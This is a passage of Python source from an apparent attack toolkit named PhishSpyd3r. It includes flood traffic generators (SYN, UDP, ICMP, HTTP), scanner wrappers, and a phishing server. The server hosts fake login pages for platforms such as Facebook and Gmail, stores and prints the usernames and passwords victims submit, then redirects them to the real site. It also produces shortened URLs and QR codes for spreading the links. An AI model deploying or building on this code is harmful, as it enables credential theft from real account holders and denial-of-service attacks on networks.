            TrafficType.TCP_CONNECT: self._generate_tcp_connect,
            TrafficType.UDP: self._generate_udp,
            TrafficType.HTTP_GET: self._generate_http_get,
            TrafficType.HTTP_POST: self._generate_http_post,
            TrafficType.HTTPS: self._generate_https,
            TrafficType.DNS: self._generate_dns,
            TrafficType.ARP: self._generate_arp,
            TrafficType.PING_FLOOD: self._generate_icmp,
            TrafficType.SYN_FLOOD: self._generate_tcp_syn,
            TrafficType.UDP_FLOOD: self._generate_udp,
            TrafficType.HTTP_FLOOD: self._generate_http_get,
            TrafficType.MIXED: self._generate_mixed,
            TrafficType.RANDOM: self._generate_random
        }
        return generators.get(traffic_type, self._generate_icmp)
    
    def _generate_icmp(self, target_ip: str, port: int) -> int:
        """Generate ICMP echo request"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet_id = random.randint(0, 65535)
            sequence = 1
            payload = b"PhishSpyd3r Traffic Test"
            header = struct.pack("!BBHHH", 8, 0, 0, packet_id, sequence)
            checksum = self._calculate_checksum(header + payload)
            header = struct.pack("!BBHHH", 8, 0, checksum, packet_id, sequence)
            packet = header + payload
            sock.sendto(packet, (target_ip, 0))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_syn(self, target_ip: str, port: int) -> int:
        """Generate TCP SYN packet"""
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_ack(self, target_ip: str, port: int) -> int:
        """Generate TCP ACK packet"""
        if not self.scapy_available:
            return 0
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="A", seq=random.randint(0, 1000000))
            send(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_tcp_connect(self, target_ip: str, port: int) -> int:
        """Create full TCP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, port))
            data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: PhishSpyd3r\r\n\r\n"
            sock.send(data.encode())
            sock.close()
            return len(data) + 40
        except:
            return 0
    
    def _generate_udp(self, target_ip: str, port: int) -> int:
        """Generate UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"PhishSpyd3r UDP Test" + os.urandom(32)
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _generate_http_get(self, target_ip: str, port: int) -> int:
        """Generate HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "PhishSpyd3r"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n") + len(data) + 100
        except:
            return 0
    
    def _generate_http_post(self, target_ip: str, port: int) -> int:
        """Generate HTTP POST request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = "test=data&from=phishspyd3r"
            headers = {"User-Agent": "PhishSpyd3r", "Content-Type": "application/x-www-form-urlencoded"}
            conn.request("POST", "/", body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _generate_https(self, target_ip: str, port: int) -> int:
        """Generate HTTPS request"""
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target_ip, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "PhishSpyd3r"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 300
        except:
            return 0
    
    def _generate_dns(self, target_ip: str, port: int) -> int:
        """Generate DNS query"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            answer_rrs = b'\x00\x00'
            authority_rrs = b'\x00\x00'
            additional_rrs = b'\x00\x00'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            dns_query = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _generate_arp(self, target_ip: str, port: int) -> int:
        """Generate ARP request"""
        if not self.scapy_available:
            return 0
        try:
            packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
            sendp(packet, verbose=False)
            return len(packet)
        except:
            return 0
    
    def _generate_mixed(self, target_ip: str, port: int) -> int:
        """Generate mixed traffic types"""
        generators = [self._generate_icmp, self._generate_tcp_syn, self._generate_udp, self._generate_http_get]
        generator = random.choice(generators)
        return generator(target_ip, port)
    
    def _generate_random(self, target_ip: str, port: int) -> int:
        """Generate random traffic"""
        traffic_types = [TrafficType.ICMP, TrafficType.TCP_SYN, TrafficType.UDP, TrafficType.HTTP_GET]
        traffic_type = random.choice(traffic_types)
        generator = self._get_generator_function(traffic_type)
        return generator(target_ip, port)
    
    def _calculate_checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        return checksum
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def stop_generation(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_generators(self) -> List[Dict]:
        """Get list of active traffic generators"""
        active = []
        for gen_id, generator in self.active_generators.items():
            active.append({
                "id": gen_id,
                "target_ip": generator.target_ip,
                "traffic_type": generator.traffic_type,
                "duration": generator.duration,
                "start_time": generator.start_time,
                "packets_sent": generator.packets_sent,
                "bytes_sent": generator.bytes_sent
            })
        return active
    
    def get_traffic_types_help(self) -> str:
        """Get help text for traffic types"""
        return """
📡 Available Traffic Types:
  icmp        - ICMP echo requests
  tcp_syn     - TCP SYN packets
  tcp_ack     - TCP ACK packets
  tcp_connect - Full TCP connections
  udp         - UDP packets
  http_get    - HTTP GET requests
  http_post   - HTTP POST requests
  https       - HTTPS requests
  dns         - DNS queries
  arp         - ARP requests
  ping_flood  - ICMP flood
  syn_flood   - SYN flood
  udp_flood   - UDP flood
  http_flood  - HTTP flood
  mixed       - Mixed traffic types
  random      - Random traffic patterns
"""

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner integration"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.nikto_available = self._check_nikto()
    
    def _check_nikto(self) -> bool:
        """Check if Nikto is available"""
        nikto_path = shutil.which('nikto')
        if nikto_path:
            logger.info(f"Nikto found at: {nikto_path}")
            return True
        
        common_paths = [
            '/usr/bin/nikto',
            '/usr/local/bin/nikto',
            '/opt/nikto/nikto.pl',
            '/usr/share/nikto/nikto.pl'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                logger.info(f"Nikto found at: {path}")
                return True
        
        logger.warning("Nikto not found.")
        return False
    
    def scan(self, target: str, options: Dict = None) -> NiktoResult:
        """Run Nikto scan on target"""
        start_time = time.time()
        options = options or {}
        
        if not self.nikto_available:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=0,
                output_file="",
                success=False,
                error="Nikto is not installed"
            )
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = self._build_nikto_command(target, output_file, options)
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=options.get('timeout', 600),
                encoding='utf-8',
                errors='ignore'
            )
            
            scan_time = time.time() - start_time
            vulnerabilities = self._parse_nikto_output(result.stdout, output_file)
            
            nikto_result = NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=vulnerabilities,
                scan_time=scan_time,
                output_file=output_file,
                success=result.returncode == 0
            )
            
            self.db.log_nikto_scan(nikto_result)
            return nikto_result
            
        except subprocess.TimeoutExpired:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error="Scan timed out"
            )
        except Exception as e:
            return NiktoResult(
                target=target,
                timestamp=datetime.datetime.now().isoformat(),
                vulnerabilities=[],
                scan_time=time.time() - start_time,
                output_file="",
                success=False,
                error=str(e)
            )
    
    def _build_nikto_command(self, target: str, output_file: str, options: Dict) -> List[str]:
        """Build Nikto command with options"""
        nikto_cmd = self._get_nikto_command()
        cmd = [nikto_cmd, '-host', target]
        
        if target.startswith('https://') or options.get('ssl', False):
            cmd.append('-ssl')
        
        if 'port' in options:
            cmd.extend(['-port', str(options['port'])])
        
        cmd.extend(['-Format', 'json', '-o', output_file])
        
        if 'tuning' in options:
            cmd.extend(['-Tuning', options['tuning']])
        
        if 'level' in options:
            cmd.extend(['-Level', str(options['level'])])
        
        if 'timeout' in options:
            cmd.extend(['-timeout', str(options['timeout'])])
        
        if options.get('verbose', False):
            cmd.append('-v')
        
        return cmd
    
    def _get_nikto_command(self) -> str:
        """Get the correct Nikto command/path"""
        nikto_path = shutil.which('nikto')
        if nikto_path:
            return nikto_path
        
        common_paths = [
            '/usr/bin/nikto',
            '/usr/local/bin/nikto',
            '/opt/nikto/nikto.pl',
            '/usr/share/nikto/nikto.pl'
        ]
        
        for path in common_paths:
            if os.path.exists(path):
                return path
        
        return 'nikto'
    
    def _parse_nikto_output(self, output: str, json_file: str) -> List[Dict]:
        """Parse Nikto output and extract vulnerabilities"""
        vulnerabilities = []
        
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r') as f:
                    data = json.load(f)
                    if 'vulnerabilities' in data:
                        vulnerabilities = data['vulnerabilities']
                    elif isinstance(data, list):
                        vulnerabilities = data
            except:
                pass
        
        if not vulnerabilities:
            lines = output.split('\n')
            for line in lines:
                if '+ ' in line or '- ' in line or 'OSVDB' in line or 'CVE' in line:
                    vulnerability = {
                        'description': line.strip(),
                        'severity': self._determine_severity(line),
                        'timestamp': datetime.datetime.now().isoformat()
                    }
                    cve_match = re.search(r'CVE-\d{4}-\d{4,7}', line)
                    if cve_match:
                        vulnerability['cve'] = cve_match.group()
                    vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    def _determine_severity(self, line: str) -> str:
        """Determine severity from Nikto output"""
        line_lower = line.lower()
        if any(word in line_lower for word in ['critical', 'severe']):
            return Severity.CRITICAL
        elif any(word in line_lower for word in ['high', 'vulnerable']):
            return Severity.HIGH
        elif any(word in line_lower for word in ['medium', 'warning']):
            return Severity.MEDIUM
        else:
            return Severity.LOW
    
    def get_available_scan_types(self) -> List[str]:
        """Get available scan types"""
        return ["full", "ssl", "cgi", "sql", "xss"]
    
    def check_target_ssl(self, target: str) -> bool:
        """Check if target supports SSL"""
        try:
            if '://' in target:
                target = target.split('://')[1]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, 443))
            sock.close()
            return result == 0
        except:
            return False

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Comprehensive network tools"""
    
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 300) -> CommandResult:
        """Execute shell command"""
        start_time = time.time()
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='ignore'
            )
            execution_time = time.time() - start_time
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time,
                error=None if result.returncode == 0 else f"Exit code: {result.returncode}"
            )
        except Exception as e:
            execution_time = time.time() - start_time
            return CommandResult(
                success=False,
                output='',
                execution_time=execution_time,
                error=str(e)
            )
    
    @staticmethod
    def ping(target: str, count: int = 4, size: int = 56, timeout: int = 1) -> CommandResult:
        """Ping with advanced options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), '-l', str(size), '-w', str(timeout * 1000), target]
            else:
                cmd = ['ping', '-c', str(count), '-s', str(size), '-W', str(timeout), target]
            return NetworkTools.execute_command(cmd, timeout * count + 5)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def traceroute(target: str, max_hops: int = 30) -> CommandResult:
        """Traceroute with options"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-h', str(max_hops), target]
            elif shutil.which('traceroute'):
                cmd = ['traceroute', '-m', str(max_hops), target]
            elif shutil.which('tracepath'):
                cmd = ['tracepath', '-m', str(max_hops), target]
            else:
                return CommandResult(
                    success=False,
                    output='No traceroute tool found',
                    execution_time=0,
                    error='No traceroute tool available'
                )
            return NetworkTools.execute_command(cmd, timeout=60)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def nmap_scan(target: str, scan_type: str = "quick", ports: str = None) -> CommandResult:
        """Nmap scan with options"""
        try:
            cmd = ['nmap']
            if scan_type == "quick":
                cmd.extend(['-T4', '-F'])
            elif scan_type == "comprehensive":
                cmd.extend(['-sS', '-sV', '-sC', '-A', '-O'])
            elif scan_type == "full":
                cmd.extend(['-p-', '-T4'])
            elif scan_type == "web":
                cmd.extend(['-p', '80,443,8080,8443', '-sV', '--script', 'http-*'])
            
            if ports:
                cmd.extend(['-p', ports])
            else:
                cmd.extend(['-p', '1-1000'])
            
            cmd.append(target)
            return NetworkTools.execute_command(cmd, timeout=600)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def curl_request(url: str, method: str = "GET", data: str = None, headers: Dict = None, timeout: int = 30) -> CommandResult:
        """cURL request with options"""
        try:
            cmd = ['curl', '-s', '-L', '-X', method]
            if headers:
                for key, value in headers.items():
                    cmd.extend(['-H', f'{key}: {value}'])
            if data:
                cmd.extend(['-d', data])
            if timeout:
                cmd.extend(['-m', str(timeout)])
            cmd.append(url)
            return NetworkTools.execute_command(cmd, timeout=timeout + 5)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def wget_download(url: str, output: str = None, timeout: int = 60) -> CommandResult:
        """wget download with options"""
        try:
            cmd = ['wget', '-q', '--show-progress']
            if output:
                cmd.extend(['-O', output])
            cmd.append(url)
            return NetworkTools.execute_command(cmd, timeout=timeout + 10)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_ip_location(ip: str) -> Dict[str, Any]:
        """Get IP geolocation"""
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'ip': ip,
                        'country': data.get('country', 'N/A'),
                        'region': data.get('regionName', 'N/A'),
                        'city': data.get('city', 'N/A'),
                        'isp': data.get('isp', 'N/A'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A')
                    }
            return {'success': False, 'ip': ip, 'error': 'Location lookup failed'}
        except Exception as e:
            return {'success': False, 'ip': ip, 'error': str(e)}
    
    @staticmethod
    def whois_lookup(target: str) -> CommandResult:
        """WHOIS lookup"""
        if not WHOIS_AVAILABLE:
            return CommandResult(
                success=False,
                output='WHOIS not available',
                execution_time=0,
                error='Install python-whois package'
            )
        try:
            import whois
            start_time = time.time()
            result = whois.whois(target)
            execution_time = time.time() - start_time
            return CommandResult(
                success=True,
                output=str(result),
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def dns_lookup(domain: str, record_type: str = "A") -> CommandResult:
        """DNS lookup"""
        try:
            cmd = ['dig', domain, record_type, '+short']
            return NetworkTools.execute_command(cmd, timeout=10)
        except Exception as e:
            return CommandResult(
                success=False,
                output='',
                execution_time=0,
                error=str(e)
            )
    
    @staticmethod
    def get_local_ip() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip_firewall(ip: str) -> bool:
        """Block IP using system firewall"""
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], check=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=PhishSpyd3r_Block_{ip}', 'dir=in', 'action=block', f'remoteip={ip}'],
                               check=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip_firewall(ip: str) -> bool:
        """Unblock IP from system firewall"""
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'], check=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=PhishSpyd3r_Block_{ip}'], check=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def shorten_url(url: str) -> str:
        """Shorten URL using TinyURL"""
        if not SHORTENER_AVAILABLE:
            return url
        try:
            import pyshorteners
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except:
            return url
    
    @staticmethod
    def generate_qr_code(url: str, filename: str) -> bool:
        """Generate QR code for URL"""
        if not QRCODE_AVAILABLE:
            return False
        try:
            import qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(filename)
            return True
        except:
            return False

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    """Network monitoring and threat detection"""
    
    def __init__(self, db_manager: DatabaseManager, config: Dict = None):
        self.db = db_manager
        self.config = config or {}
        self.monitoring = False
        self.monitored_ips = set()
        self.thresholds = {
            'port_scan': self.config.get('monitoring', {}).get('port_scan_threshold', 10),
            'syn_flood': self.config.get('monitoring', {}).get('syn_flood_threshold', 100),
            'udp_flood': self.config.get('monitoring', {}).get('udp_flood_threshold', 500)
        }
        self.auto_block = self.config.get('security', {}).get('auto_block', False)
        self.auto_block_threshold = self.config.get('security', {}).get('auto_block_threshold', 5)
        self.connection_tracker = {}
    
    def start_monitoring(self):
        """Start network monitoring"""
        if self.monitoring:
            return
        self.monitoring = True
        logger.info("Starting network monitoring...")
        managed = self.db.get_managed_ips()
        self.monitored_ips = {ip['ip_address'] for ip in managed if not ip.get('is_blocked', False)}
        print(f"{Colors.SUCCESS}✅ Threat monitoring started with {len(self.monitored_ips)} monitored IPs{Colors.RESET}")
    
    def stop_monitoring(self):
        """Stop network monitoring"""
        self.monitoring = False
        self.connection_tracker.clear()
        logger.info("Network monitoring stopped")
    
    def add_ip_to_monitoring(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        """Add IP to monitoring"""
        try:
            ipaddress.ip_address(ip)
            self.monitored_ips.add(ip)
            return self.db.add_managed_ip(ip, added_by, notes)
        except:
            return False
    
    def remove_ip_from_monitoring(self, ip: str) -> bool:
        """Remove IP from monitoring"""
        try:
            if ip in self.monitored_ips:
                self.monitored_ips.remove(ip)
            return self.db.remove_managed_ip(ip)
        except:
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        """Block an IP"""
        try:
            firewall_success = NetworkTools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, executed_by)
            if ip in self.monitored_ips:
                self.monitored_ips.remove(ip)
            return firewall_success or db_success
        except:
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        """Unblock an IP"""
        try:
            firewall_success = NetworkTools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, executed_by)
            return firewall_success or db_success
        except:
            return False
    
    def get_status(self) -> Dict[str, Any]:
        """Get monitoring status"""
        stats = self.db.get_statistics()
        return {
            'monitoring': self.monitoring,
            'monitored_ips_count': len(self.monitored_ips),
            'blocked_ips': stats.get('total_blocked_ips', 0),
            'auto_block': self.auto_block
        }

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing pages"""
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            if self.path == '/':
                self.send_phishing_page()
            elif self.path.startswith('/capture'):
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error handling GET request: {e}")
    
    def do_POST(self):
        """Handle POST requests (form submissions)"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')
            form_data = urllib.parse.parse_qs(post_data)
            
            username = form_data.get('email', form_data.get('username', form_data.get('user', [''])))[0]
            password = form_data.get('password', [''])[0]
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            if self.server_instance and self.server_instance.db:
                self.server_instance.db.save_captured_credential(
                    self.server_instance.link_id, username, password,
                    client_ip, user_agent, json.dumps(dict(self.headers))
                )
                
                print(f"\n{Colors.ACCENT}🎣 PHISHING CREDENTIALS CAPTURED!{Colors.RESET}")
                print(f"{Colors.PRIMARY}📧 From: {client_ip}{Colors.RESET}")
                print(f"{Colors.SECONDARY}👤 Username: {username}{Colors.RESET}")
                print(f"{Colors.WARNING}🔑 Password: {password}{Colors.RESET}")
            
            self.send_response(302)
            redirect_urls = {
                'facebook': 'https://www.facebook.com',
                'instagram': 'https://www.instagram.com',
                'twitter': 'https://twitter.com',
                'gmail': 'https://mail.google.com',
                'linkedin': 'https://www.linkedin.com'
            }
            platform = self.server_instance.platform if self.server_instance else 'unknown'
            self.send_header('Location', redirect_urls.get(platform, 'https://www.google.com'))
            self.end_headers()
            
        except Exception as e:
            logger.error(f"Error handling POST request: {e}")
            self.send_response(500)
            self.end_headers()
    
    def send_phishing_page(self):
        """Send the phishing page"""
        try:
            if self.server_instance and self.server_instance.html_content:
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(self.server_instance.html_content.encode('utf-8'))
                if self.server_instance.db and self.server_instance.link_id:
                    self.server_instance.db.update_phishing_link_clicks(self.server_instance.link_id)
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            logger.error(f"Error sending phishing page: {e}")
            self.send_response(500)
            self.end_headers()

class PhishingServer:
    """Phishing server for hosting fake login pages"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.server_thread = None
        self.running = False
        self.port = 8080
        self.link_id = None
        self.platform = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        """Start phishing server"""
        try:
            self.link_id = link_id
            self.platform = platform
            self.html_content = html_content
            self.port = port
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            logger.info(f"Phishing server started on port {port}")
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        """Stop phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
            logger.info("Phishing server stopped")
    
    def get_url(self) -> str:
        """Get server URL"""
        local_ip = NetworkTools.get_local_ip()
        return f"http://{local_ip}:{self.port}"

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None) -> Dict[str, Any]:
        """Generate phishing link for specified platform"""
        try:
            link_id = str(uuid.uuid4())[:8]
            
            templates = self.db.get_phishing_templates(platform)
            if templates:
                html_content = templates[0].get('html_content', '')
            else:
                template_methods = {
                    'facebook': self.db._get_facebook_template,
                    'instagram': self.db._get_instagram_template,
                    'twitter': self.db._get_twitter_template,
                    'gmail': self.db._get_gmail_template,
                    'linkedin': self.db._get_linkedin_template
                }
                html_content = template_methods.get(platform, self._get_custom_template)()
            
            phishing_link = PhishingLink(
                id=link_id,
                platform=platform,
                original_url=custom_url or f"https://www.{platform}.com",
                phishing_url=f"http://localhost:8080/{link_id}",
                template=platform,
                created_at=datetime.datetime.now().isoformat()
            )
            
            self.db.save_phishing_link(phishing_link)
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_link.phishing_url,
                'created_at': phishing_link.created_at
            }
        except Exception as e:
            logger.error(f"Failed to generate phishing link: {e}")
            return {'success': False, 'error': str(e)}
    
    def _get_custom_template(self) -> str:
        """Get custom phishing template"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #0066cc 0%, #0099ff 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #0066cc;
            font-size: 28px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #0066cc 0%, #0099ff 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            opacity: 0.9;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 5px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Login</h1>
            </div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="warning">
                ⚠️ Security test page - Do not use real credentials
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server for a specific link"""
        if link_id not in self.active_links:
            logger.error(f"Link ID {link_id} not found")
            return False
        
        link_data = self.active_links[link_id]
        return self.phishing_server.start(
            link_id=link_id,
            platform=link_data['platform'],
            html_content=link_data['html'],
            port=port
        )
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        self.phishing_server.stop()
    
    def get_server_url(self) -> str:
        """Get phishing server URL"""
        return self.phishing_server.get_url()
    
    def get_active_links(self) -> List[Dict]:
        """Get active phishing links"""
        links = []
        for link_id, data in self.active_links.items():
            links.append({
                'link_id': link_id,
                'platform': data['platform'],
                'created': data['created'].isoformat(),
                'server_running': self.phishing_server.running and self.phishing_server.link_id == link_id
            })
        return links
    
    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for phishing link"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        if NetworkTools.generate_qr_code(url, qr_filename):
            return qr_filename
        return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten phishing URL"""
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = self.phishing_server.get_url() if self.phishing_server.running else link.get('phishing_url', '')
        return NetworkTools.shorten_url(url)

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Handle all commands"""
    
    def __init__(self, db: DatabaseManager, nikto_scanner: NiktoScanner = None,
                 traffic_generator: TrafficGeneratorEngine = None,
                 crunch_generator: CrunchGenerator = None):
        self.db = db
        self.nikto = nikto_scanner
        self.traffic_gen = traffic_generator
        self.crunch = crunch_generator
        self.time_manager = TimeManager(db)
